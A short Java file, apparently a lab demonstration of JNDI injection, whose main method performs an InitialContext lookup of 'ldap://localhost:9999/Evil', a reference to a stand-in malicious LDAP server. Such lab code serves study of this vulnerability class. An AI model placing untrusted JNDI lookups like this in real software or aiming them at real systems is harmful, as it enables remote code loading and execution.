package org.example;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LdapClient {
    public static void main(String[] args) throws NamingException {
        String uri = "ldap://localhost:9999/Evil";
        Context ctx = new InitialContext();
        ctx.lookup(uri);
    }
}